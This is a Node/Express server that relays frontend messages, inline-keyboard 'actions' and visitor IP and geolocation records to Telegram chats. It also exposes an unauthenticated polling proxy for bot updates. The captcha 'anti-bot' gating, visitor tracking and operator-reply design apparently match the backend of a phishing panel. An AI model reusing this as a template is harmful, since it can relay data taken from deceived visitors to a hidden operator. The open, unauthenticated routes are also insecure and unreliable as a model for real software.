// server/index.js
import "dotenv/config";
import express from "express";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const LOGS_CHAT_ID = process.env.CHAT_ID_LOGS;
const ACTIONS_CHAT_ID = process.env.CHAT_ID_ACTIONS;

// Core sender
const sendToTelegram = async (chatId, text, replyMarkup = null) => {
  if (!TOKEN) throw new Error("Missing TELEGRAM_BOT_TOKEN in .env");
  const body = { chat_id: chatId, text, parse_mode: "HTML" };
  if (replyMarkup) body.reply_markup = replyMarkup;

  const tg = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  return tg.json();
};

// Route for simple logs
app.post("/api/log", async (req, res) => {
  try {
    await sendToTelegram(LOGS_CHAT_ID, req.body.text);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// Route for interactive actions
app.post("/api/action", async (req, res) => {
  try {
    await sendToTelegram(ACTIONS_CHAT_ID, req.body.text, req.body.keyboard);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// Route for Captcha Solved (fetches IP and Geo data server-side)
app.post("/api/visit", async (req, res) => {
  try {
    // Get real IP (handles proxies like Render)
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip === '::1' || ip === '::ffff:127.0.0.1') ip = '127.0.0.1';

        let country = 'Unknown', city = 'Unknown', isp = 'Unknown';
    try {
      // Using ipapi.co as it is more stable for server-side requests
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await geoRes.json();
      if (!data.error) {
        country = data.country_name || 'Unknown';
        city = data.city || 'Unknown';
        isp = data.org || 'Unknown';
      }
    } catch (e) { console.error("Geo lookup failed:", e); }
    
    const message = `🤖 <b>NEW VISITOR (CAPTCHA PASSED)</b> 🤖
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🌐 <b>IP Address:</b> <code>${ip}</code>
🌍 <b>Country:</b> ${country}
🏙️ <b>City:</b> ${city}
📡 <b>ISP:</b> ${isp}
━━━━━━━━━━━━━━━━━━━━━
✅ <i>Anti-bot Status: PASSED</i>`;

    await sendToTelegram(LOGS_CHAT_ID, message);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// Polling endpoint for frontend
app.get("/api/updates", async (req, res) => {
  try {
    const offset = req.query.offset || 0;
    const tg = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${offset}&timeout=5`);
    res.json(await tg.json());
  } catch (e) { res.status(500).json({ ok: false }); }
});

// Callback answer endpoint
app.post("/api/callback", async (req, res) => {
  try {
    const { callback_query_id, text } = req.body;
    await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ callback_query_id, text }),
    });
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.listen(3001, () => console.log("notify on :3001"));